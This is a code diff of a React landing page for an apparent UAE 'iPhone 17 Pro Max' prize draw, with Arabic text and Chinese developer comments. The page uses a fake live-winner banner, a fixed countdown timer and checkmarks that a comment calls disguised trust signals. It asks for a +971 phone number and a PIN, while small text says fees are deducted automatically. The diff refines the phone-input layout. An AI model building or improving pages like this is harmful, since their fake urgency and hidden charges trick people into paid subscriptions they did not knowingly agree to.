@@ -84,7 +84,6 @@ export default function Home() {
 
   return (
     <div style={styles.page}>
-      {/* 顶部中奖弹幕条 */}
       <div style={styles.liveBanner}>
         <span style={styles.pulseDot}></span> {liveWinner}
       </div>
@@ -103,13 +102,11 @@ export default function Home() {
         <h1 style={styles.title}>iPhone 17 Pro Max</h1>
         <p style={styles.subtitle}>🎁 السحب السنوي الأكبر في الإمارات</p>
 
-        {/* 倒计时倒数模块 - 优化间距 */}
         <div style={styles.countdownBox}>
           ⏰ ينتهي العرض خلال
           <div style={styles.countdownTimer}>2:46</div>
         </div>
 
-        {/* 伪装的对勾信任行 */}
         <div style={styles.trustList}>
           <div style={styles.trustItem}>أدخل رقم هاتفك <span style={styles.checkmark}>✓</span></div>
           <div style={styles.trustItem}>تأكيد الاشتراك <span style={styles.checkmark}>✓</span></div>
@@ -118,23 +115,26 @@ export default function Home() {
 
         {errorMsg && <div style={styles.errorBubble}>{errorMsg}</div>}
 
-        {/* 步骤 1：输入手机号 */}
+        {/* 步骤 1：输入手机号（包含全新+971国家代码格子） */}
         {step === 1 && (
           <div style={styles.formSection}>
-            <input
-              type="tel"
-              placeholder="5xxxxxxxx"
-              value={msisdn}
-              onChange={(e) => setMsisdn(e.target.value.replace(/\D/g, ""))}
-              style={styles.input}
-            />
+            <div style={styles.phoneInputContainer}>
+              <div style={styles.countryCodeBox}>+971</div>
+              <input
+                type="tel"
+                placeholder="5xxxxxxxx"
+                value={msisdn}
+                onChange={(e) => setMsisdn(e.target.value.replace(/\D/g, ""))}
+                style={styles.inputField}
+              />
+            </div>
 
             <button style={styles.button} onClick={submitNumber} disabled={loading}>
               {loading ? "جاري التحقق..." : "شارك الآن 🎁"}
             </button>
 
             <div style={styles.bottomText}>
-              بالضغط علىButton، أنت توافق على الشروط والأحكام. سيتم خصم الرسوم تلقائياً.
+              بالضغط على Button، أنت توافق على الشروط والأحكام. سيتم خصم الرسوم تلقائياً.
             </div>
           </div>
         )}
@@ -181,17 +181,17 @@ const styles = {
     display: "flex",
     flexDirection: "column",
     alignItems: "center",
-    padding: "60px 15px 40px 15px", // 顶部留出固定横幅位，底部留空，防止跑偏
+    padding: "60px 15px 40px 15px",
     boxSizing: "border-box",
     position: "relative"
   },
   liveBanner: {
-    position: "fixed", // 改为 fixed，在手机上永远置顶滚动
+    position: "fixed",
     top: 0,
     left: 0,
     right: 0,
     height: "44px",
-    background: "#22c55e", // 对应你截图上的原版原汁原味高亮绿
+    background: "#22c55e",
     color: "#fff",
     display: "flex",
     justifyContent: "center",
@@ -207,15 +207,14 @@ const styles = {
     background: "#fff",
     borderRadius: "999px",
     marginRight: "8px",
-    display: "inline-block",
-    animation: "pulse 1.5s infinite"
+    display: "inline-block"
   },
   card: {
     width: "100%",
     maxWidth: "400px",
     background: "#121212",
     borderRadius: "24px",
-    padding: "24px 20px", // 稍微收紧内边距，给下部腾出空间
+    padding: "24px 20px",
     textAlign: "center",
     border: "1px solid #1a1a1a",
     boxShadow: "0 20px 50px rgba(0,0,0,0.8)",
@@ -223,7 +222,7 @@ const styles = {
   },
   topBadge: {
     display: "inline-block",
-    background: "#eab308", // 土豪金包裹
+    background: "#eab308",
     color: "#000",
     padding: "6px 16px",
     borderRadius: "999px",
@@ -235,7 +234,7 @@ const styles = {
     margin: "0 auto 12px auto"
   },
   phone: {
-    width: "130px", // 稍微收紧图片尺寸，防止把输入框挤压下去
+    width: "130px",
     height: "auto",
     display: "block",
     margin: "0 auto"
@@ -252,7 +251,7 @@ const styles = {
     margin: "0 0 16px 0"
   },
   countdownBox: {
-    background: "#7f1d1d", // 截图上的暗红色倒计时背板
+    background: "#7f1d1d",
     color: "#fff",
     padding: "10px",
     borderRadius: "14px",
@@ -267,7 +266,7 @@ const styles = {
     marginTop: "2px"
   },
   trustList: {
-    background: "#1e293b", // 暗蓝色排版行
+    background: "#1e293b",
     borderRadius: "14px",
     padding: "10px 14px",
     marginBottom: "20px",
@@ -294,20 +293,43 @@ const styles = {
     alignItems: "center",
     boxSizing: "border-box"
   },
-  input: {
-    width: "100%", // 撑满父容器，保证对齐
+  
+  /* 🔥 全新设计的手机号组合框样式，彻底对齐 */
+  phoneInputContainer: {
+    display: "flex",
+    width: "100%",
     height: "54px",
     borderRadius: "14px",
     border: "2px solid #334155",
     background: "#0f172a",
+    overflow: "hidden",
+    marginBottom: "14px",
+    boxSizing: "border-box"
+  },
+  countryCodeBox: {
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    background: "#1e293b", // 给+971格子一个高级深灰底色
+    color: "#fff",
+    fontSize: "16px",
+    fontWeight: "bold",
+    padding: "0 16px",
+    borderRight: "1px solid #334155",
+    userSelect: "none"
+  },
+  inputField: {
+    flex: 1,
+    background: "transparent",
+    border: "none",
     color: "white",
     padding: "0 16px",
     fontSize: "18px",
-    marginBottom: "14px",
     outline: "none",
-    boxSizing: "border-box", // 极其重要：防止盒模型撑开错位
-    textAlign: "center"
+    fontWeight: "bold",
+    letterSpacing: "1px"
   },
+
   pinInput: {
     width: "100%",
     height: "54px",
@@ -325,11 +347,11 @@ const styles = {
     boxSizing: "border-box"
   },
   button: {
-    width: "100%", // 100% 宽度，与输入框完美等宽对齐
+    width: "100%",
     height: "54px",
     borderRadius: "14px",
     border: "none",
-    background: "#eab308", // 原汁原味的亮黄中奖动作按钮
+    background: "#eab308",
     color: "#000",
     fontSize: "18px",
     fontWeight: "bold",
